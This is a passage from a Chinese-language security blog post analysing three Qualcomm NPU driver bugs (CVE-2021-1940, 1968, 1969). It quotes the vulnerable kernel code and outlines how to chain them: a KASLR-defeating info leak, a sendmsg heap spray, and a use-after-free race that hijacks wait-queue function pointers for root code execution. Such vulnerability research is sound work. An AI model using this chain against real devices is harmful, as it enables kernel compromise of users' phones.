<ul>
<li>有没有可能使<code>npu_send_network_cmd</code>返回<code>-EBUSY</code>并触发这个路径？</li>
<li>即使这个路径被触发，如何获得对持有被释放的<code>npu_client</code>引用的<code>npu_network</code>的访问？一旦<code>npu_client</code>被释放，文件将被关闭，将无法使用这个<code>npu_client</code>访问 NPU 驱动。因为所有对<code>npu_network</code>的访问都是通过对<code>npu_client</code>的检查来保护的，除非能够使用现在被释放的客户端进行<code>ioctl</code>调用，否则将无法检索到持有被释放的<code>npu_client</code>的<code>npu_network</code>。然而，使用这个被释放的客户端进行<code>ioctl</code>调用，需要对被释放的<code>npu_client</code>有访问权。</li>
</ul>
<h2 id="CVE-2021-1940（条件竞争）"><a href="#CVE-2021-1940（条件竞争）" class="headerlink" title="CVE-2021-1940（条件竞争）"></a>CVE-2021-1940（条件竞争）</h2><p>查看 <a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#1127"><code>npu_send_network_cmd</code></a>，如果 <code>npu_network</code>设置了 <code>cmd_pending</code> ，则将返回 <code>-EBUSY</code> ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_send_network_cmd</span><span class="params">(<span class="keyword">struct</span> npu_device *npu_dev,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> npu_network *network, <span class="type">void</span> *cmd_ptr, <span class="type">bool</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (network-&gt;cmd_pending) &#123;</span><br><span class="line">		pr_err(<span class="string">&quot;Another cmd is pending\n&quot;</span>);</span><br><span class="line">		ret = -EBUSY;</span><br></pre></td></tr></table></figure>

<p>在调用<code>npu_send_network_cmd</code>向NPU发送命令时设置<code>cmd_pending</code>，在 NPU 处理完命令后被重置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_send_network_cmd</span><span class="params">(<span class="keyword">struct</span> npu_device *npu_dev,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> npu_network *network, <span class="type">void</span> *cmd_ptr, <span class="type">bool</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		network-&gt;cmd_async = async;</span><br><span class="line">		network-&gt;cmd_ret_status = <span class="number">0</span>;</span><br><span class="line">		network-&gt;cmd_pending = <span class="literal">true</span>;</span><br><span class="line">		network-&gt;trans_id = <span class="type">atomic_read</span>(&amp;host_ctx-&gt;ipc_trans_id);</span><br><span class="line">		ret = npu_host_ipc_send_cmd(npu_dev,</span><br><span class="line">			IPC_QUEUE_APPS_EXEC, cmd_ptr);</span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">switch</span> (msg_id) &#123;</span><br><span class="line">	<span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_DONE:</span><br><span class="line">	&#123;</span><br><span class="line">        ...</span><br><span class="line">		network-&gt;cmd_pending = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>通过发布一个异步的<code>npu_exec_network</code>命令，然后迅速关闭文件<code>/dev/msm_npu</code>，该命令仍然可能正在被 NPU 处理，在这种情况下，<code>cmd_pending</code> 将为<code>true</code>。</p>
<p>事实证明，这也是第二个问题的解决方案。当以异步模式发送<code>npu_exec_network</code>任务时，我没有必要去获取包含释放的<code>npu_client</code>的<code>npu_network</code>。我只需要等待，让NPU为我完成任务。当NPU完成任务并向CPU发送RPC时，该消息将由<code>app_msg_proc</code>处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_V2_DONE:</span><br><span class="line">	&#123;</span><br><span class="line">        ...</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;cmd_async) &#123;</span><br><span class="line">            ...</span><br><span class="line">			<span class="keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>它将把<code>network-&gt;client</code>（现在已经被释放）传递给<code>npu_queue_event</code>。更重要的是，<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#1146"><code>npu_queue_event</code></a>对客户端的<code>wait_queue_head_t wait</code>执行<code>wake_up_interruptible</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_queue_event</span><span class="params">(<span class="keyword">struct</span> npu_client *client, <span class="keyword">struct</span> npu_kevent *evt)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	wake_up_interruptible(&amp;client-&gt;wait);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这将调用一个存储在队列<code>wait</code>的中的函数，并将条目的指针作为第一个参数。因此，通过用一个假的对象替换<code>npu_client</code>，并让它的等待队列指向一个有控制数据的地址，可以执行任何带有一个参数的函数。因为它是在一个内核工作者上执行的，所以会以<code>root</code>身份执行。这个错误为<code>CVE-2021-1940</code>。</p>
<h2 id="CVE-2021-1968（错误的调试信息输出）"><a href="#CVE-2021-1968（错误的调试信息输出）" class="headerlink" title="CVE-2021-1968（错误的调试信息输出）"></a>CVE-2021-1968（错误的调试信息输出）</h2><p>当使用 <code>npu_exec_network_v2</code> API 执行一个<code>network</code>时，可以指定<code>network</code>的 <code>stats_buf</code> （可能是用于收集配置和调试信息的）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span> <span class="title function_">npu_host_exec_network_v2</span><span class="params">(<span class="keyword">struct</span> npu_client *client,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> msm_npu_exec_network_ioctl_v2 *exec_ioctl,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> msm_npu_patch_buf_info *patch_buf_info)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	network-&gt;stats_buf_u = (<span class="type">void</span> __user *)exec_ioctl-&gt;stats_buf_addr;</span><br><span class="line">	network-&gt;stats_buf_size = exec_ioctl-&gt;stats_buf_size;</span><br></pre></td></tr></table></figure>

<p>当 NPU 在完成<code>npu_exec_network_v2</code> 后向 CPU 发送消息时，<code>stats_buf</code>将由<code>app_msg_proc</code>处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_V2_DONE:</span><br><span class="line">	&#123;</span><br><span class="line">        ...</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;cmd_async) &#123;</span><br><span class="line">            ...</span><br><span class="line">			kevt.reserved[<span class="number">0</span>] = (<span class="type">uint64_t</span>)network-&gt;stats_buf;</span><br><span class="line">			kevt.reserved[<span class="number">1</span>] = (<span class="type">uint64_t</span>)network-&gt;stats_buf_u;</span><br><span class="line">			<span class="keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))</span><br></pre></td></tr></table></figure>

<p>其中将存储<code>stats_buf</code>的地址和一个用户空间的地址，作为将<code>stats_buf</code>复制回用户空间的目标。这些都被存储在一个事件的<code>reserved</code>中。当用户想要读取 <code>stats_buf</code> 的内容时，可以使用 <a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1595"><code>npu_receive_event</code></a> <code>ioctl</code> 调用，然后调用 <a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1610"><code>npu_process_kevent</code></a> 函数来处理上面用 <code>npu_queue_event</code> 发送的事件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_process_kevent</span><span class="params">(<span class="keyword">struct</span> npu_kevent *kevt)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">switch</span> (kevt-&gt;evt.type) &#123;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_EVENT_TYPE_EXEC_V2_DONE:</span><br><span class="line">		ret = copy_to_user((<span class="type">void</span> __user *)kevt-&gt;reserved[<span class="number">1</span>],</span><br><span class="line">			(<span class="type">void</span> *)&amp;kevt-&gt;reserved[<span class="number">0</span>],                      <span class="comment">//&lt;----------- 1.</span></span><br><span class="line">			kevt-&gt;evt.u.exec_v2_done.stats_buf_size);</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面的代码中，<code>copy_to_user</code>是为了将<code>stats_buf</code>的内容复制到用户空间。由于<code>stats_buf</code>的地址被存储为<code>kevt-&gt;reserved[0]</code>，<code>copy_to_user</code>的源应该是<code>kevt-&gt;reserved[0]</code>。但是，<code>&amp;kevt-&gt;reserved[0]</code>被使用，这意味着<code>kevt</code>的内容在<code>reserved[0]</code>的偏移处被复制。当然，这个内容是<code>stats_buf</code>的地址和用户空间的地址<code>stats_buf_u</code>。此外，由于 <code>stats_buf</code> 的大小可能远远大于 <code>kevt</code> 的大小，这实际上会导致 <code>copy_to_user</code> 的越界读取。(由于<code>hardened usercopy</code>，它不能读取桶中的下一个对象，但它可以被用来读取未初始化的内存)。这个错误为<code>CVE-2021-1968</code>。</p>
<h2 id="CVE-2021-1969（错误的数据拷贝）"><a href="#CVE-2021-1969（错误的数据拷贝）" class="headerlink" title="CVE-2021-1969（错误的数据拷贝）"></a>CVE-2021-1969（错误的数据拷贝）</h2><p> <code>app_msg_proc</code>的实现中还有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_kevent</span> <span class="title">kevt</span>;</span>                         <span class="comment">//&lt;---------- 1.</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">switch</span> (msg_id) &#123;</span><br><span class="line">	<span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_V2_DONE:</span><br><span class="line">	&#123;</span><br><span class="line">        ...</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;cmd_async) &#123;</span><br><span class="line">			pr_debug(<span class="string">&quot;async cmd, queue event\n&quot;</span>);</span><br><span class="line">			kevt.evt.type = MSM_NPU_EVENT_TYPE_EXEC_V2_DONE;</span><br><span class="line">			kevt.evt.u.exec_v2_done.network_hdl = exe_rsp_pkt-&gt;network_hdl;</span><br><span class="line">			kevt.evt.u.exec_v2_done.exec_result = exe_rsp_pkt-&gt;header.status;</span><br><span class="line">			kevt.evt.u.exec_v2_done.stats_buf_size = stats_size;</span><br><span class="line">			kevt.reserved[<span class="number">0</span>] = (<span class="type">uint64_t</span>)network-&gt;stats_buf;</span><br><span class="line">			kevt.reserved[<span class="number">1</span>] = (<span class="type">uint64_t</span>)network-&gt;stats_buf_u;</span><br><span class="line">			<span class="keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))</span><br><span class="line">				pr_err(<span class="string">&quot;queue npu event failed\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>变量<code>kevt</code> 的所有字段都被初始化了吗？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">npu_kevent</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event</span> <span class="title">evt</span>;</span></span><br><span class="line">	<span class="type">uint64_t</span> reserved[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>reserved</code>是一个长度为<code>4</code>的数组，但只有<code>reserved[0]</code>和<code>reserved[1]</code>被初始化。事实证明这不是一个问题，因为当<code>kevt</code>被<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1595"><code>npu_receive_kevent</code></a>使用时，只有<code>evt</code>、<code>reserved[0]</code>和<code>reserved[1]</code>被使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_receive_event</span><span class="params">(<span class="keyword">struct</span> npu_client *client,</span></span><br><span class="line"><span class="params">	<span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_kevent</span> *<span class="title">kevt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (list_empty(&amp;client-&gt;evt_list)) &#123;</span><br><span class="line">      ...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		npu_process_kevent(kevt);               <span class="comment">//&lt;------ only uses `reserved[0]` and `reserved[1]`</span></span><br><span class="line">		ret = copy_to_user(argp, &amp;kevt-&gt;evt,</span><br><span class="line">			<span class="keyword">sizeof</span>(<span class="keyword">struct</span> msm_npu_event));</span><br><span class="line">        ...</span><br><span class="line">	&#125;</span><br><span class="line">	mutex_unlock(&amp;client-&gt;list_lock);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着检查是否<code>evt</code>的所有字段都被初始化了呢？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event</span> &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> type;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event_execute_done</span> <span class="title">exec_done</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event_execute_v2_done</span> <span class="title">exec_v2_done</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event_ssr</span> <span class="title">ssr</span>;</span></span><br><span class="line">		<span class="type">uint8_t</span> data[<span class="number">128</span>];</span><br><span class="line">	&#125; u;</span><br><span class="line">	<span class="type">uint32_t</span> reserved[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msm_npu_event_execute_v2_done</span> &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> network_hdl;</span><br><span class="line">	<span class="type">int32_t</span> exec_result;</span><br><span class="line">	<span class="comment">/* stats buf size filled */</span></span><br><span class="line">	<span class="type">uint32_t</span> stats_buf_size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>确实都是初始化的。问题是，联合体的大小是其最大成员的大小，在<code>msm_npu_event</code>的例子中，是<code>data[128]</code>，这比<code>msm_npu_event_execute_v2_done</code>的大小大得多。所以会有很多未被初始化的填充。<code>reserved[4]</code>也是完全未被初始化的。更糟糕的是，正如我们在上面看到的，<code>npu_receive_event</code>将简单地把整个<code>msm_npu_event</code>复制到用户空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_receive_event</span><span class="params">(<span class="keyword">struct</span> npu_client *client,</span></span><br><span class="line"><span class="params">	<span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_kevent</span> *<span class="title">kevt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (list_empty(&amp;client-&gt;evt_list)) &#123;</span><br><span class="line">      ...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		ret = copy_to_user(argp, &amp;kevt-&gt;evt,</span><br><span class="line">			<span class="keyword">sizeof</span>(<span class="keyword">struct</span> msm_npu_event));</span><br><span class="line">        ...</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着拷贝到用户空间中的数据包含大量为初始化数据，这个错误为<code>CVE-2021-1969</code>。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>这三个漏洞加在一起，提供了非常强大的原语，既可以泄露内核地址以击败内核地址空间布局随机化，又可以用受控参数执行任意函数。获得任意内核代码执行的步骤如下：</p>
<ol>
<li>使用<code>CVE-2021-1968</code>获得<code>stats_buf</code>的地址，然后回收它，这样就可以用受控数据填充它。</li>
<li>使用<code>CVE-2021-1969</code>获得一个内核函数的地址，以击败<code>KASLR</code>。</li>
<li>使用<code>CVE-2021-1940</code>，用从第一和第二步获得的信息执行任意代码。</li>
</ol>
<h2 id="获得受控数据的地址"><a href="#获得受控数据的地址" class="headerlink" title="获得受控数据的地址"></a>获得受控数据的地址</h2><p>在前面<em><strong>错误的调试信息输出</strong></em>一节中说到，通过在异步模式下使用<code>npu_exec_network_v2</code> <code>ioctl</code>调用，<code>stats_buf</code>缓冲区的地址将被复制到在加载网络时提供的一个用户空间缓冲区。<code>stats_buf</code>通过<code>kzalloc</code>分配为一个大小为<code>0x4000</code>的缓冲区，当<code>npu_network</code>通过<code>npu_unload_network</code> <code>ioctl</code>被卸载时，它将被释放。</p>
<ol>
<li>使用 <code>npu_exec_network_v2</code> 触发 <code>CVE-2021-1968</code> 并获得指定的一个 <code>npu_network</code> 的 <code>stats_buf</code> 的地址。</li>
<li>使用 <code>npu_unload_network</code> 卸载网络，释放 <code>stats_buf</code>。</li>
<li>使用<code>sendmsg</code>系统调用分配一个大小为<code>0x4000</code>的消息缓冲区来回收释放的<code>stats_buf</code>。由于这种大小的分配是非常罕见的，这几乎总是在释放的 <code>stats_buf</code> 的地址上分配消息缓冲区。这意味着在第一步中获得的 <code>stats_buf</code> 的地址现在指向了消息缓冲区的内容，并可以完全控制它。</li>
</ol>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html"><code>sendmsg</code></a>是一个标准的linux内核堆喷射技术，可以用来分配几乎任意大小的任意数据。</p>
</blockquote>
<h2 id="击败-KASLR"><a href="#击败-KASLR" class="headerlink" title="击败 KASLR"></a>击败 KASLR</h2><p>使用<code>CVE-2021-1969</code>来获取内核函数地址，以击败KASLR。回顾<em><strong>错误的数据拷贝</strong></em>一节，被复制回用户空间的未初始化变量起源于<code>app_proc_msg</code>的<code>npu_kevent</code>变量<code>kevt</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_kevent</span> <span class="title">kevt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">switch</span> (msg_id) &#123;</span><br><span class="line">	<span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_V2_DONE:</span><br><span class="line">	&#123;</span><br><span class="line">        ...</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;cmd_async) &#123;</span><br><span class="line">            ...</span><br><span class="line">			<span class="keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>所以这里的未初始化变量是一个堆栈变量。注意，尽管 Android 11 在内核中提供了对自动变量初始化的支持，但设置内核配置<code>CONFIG_INIT_STACK_ALL</code>才可以，不是所有的供应商都启用了这个配置。特别是，在写这篇文章的时候，所有的三星设备上都没有启用这个配置。(似乎只有运行5.4内核的设备，即S21、Z flip3等，才启用这一功能）。</p>
<p>经过一些测试，<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#398"><code>host_irq_wq</code></a>的地址似乎在未初始化变量<code>kevt</code>中具有完全相同的偏移。</p>
<p><strong>怎么知道这个不变的地址是<code>host_irq_wq</code>呢？</strong></p>
<h2 id="获取任意代码执行"><a href="#获取任意代码执行" class="headerlink" title="获取任意代码执行"></a>获取任意代码执行</h2><p>回顾<em><strong>条件竞争</strong></em>一节，想要利用，需要做以下的条件竞争：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/npu_race.png" alt="npu_race"></p>
<p>接下来就是用一个合适的假对象来替换被释放的<code>npu_client</code>。回顾一下，<code>npu_client</code>的使用方式是它的等待队列被放入<code>wake_up_interruptible</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_queue_event</span><span class="params">(<span class="keyword">struct</span> npu_client *client, <span class="keyword">struct</span> npu_kevent *evt)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	wake_up_interruptible(&amp;client-&gt;wait);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>wake_up_interruptible</code>是<code>__wake_up_common</code>的一个包装，将<code>&amp;client-&gt;wait</code>作为<code>wq_head</code>传递给它，并将其他参数设置为一些默认值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __wake_up_common(<span class="keyword">struct</span> wait_queue_head *wq_head, <span class="type">unsigned</span> <span class="type">int</span> mode,</span><br><span class="line">			<span class="type">int</span> nr_exclusive, <span class="type">int</span> wake_flags, <span class="type">void</span> *key,</span><br><span class="line">			<span class="type">wait_queue_entry_t</span> *bookmark)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">wait_queue_entry_t</span> *curr, *next;</span><br><span class="line">	<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	lockdep_assert_held(&amp;wq_head-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bookmark &amp;&amp; (bookmark-&gt;flags &amp; WQ_FLAG_BOOKMARK)) &#123;</span><br><span class="line">        ...</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		curr = list_first_entry(&amp;wq_head-&gt;head, <span class="type">wait_queue_entry_t</span>, entry);    <span class="comment">//&lt;----------- 1.</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">	list_for_each_entry_safe_from(curr, next, &amp;wq_head-&gt;head, entry) &#123;</span><br><span class="line">        ...</span><br><span class="line">		ret = curr-&gt;func(curr, mode, wake_flags, key);          <span class="comment">//&lt;------------ 2.</span></span><br><span class="line">        ...</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>队列<code>client-&gt;wait</code>中的条目将被取出，存储在该条目中的<code>func</code>函数被执行，该条目是第一个参数。</p>
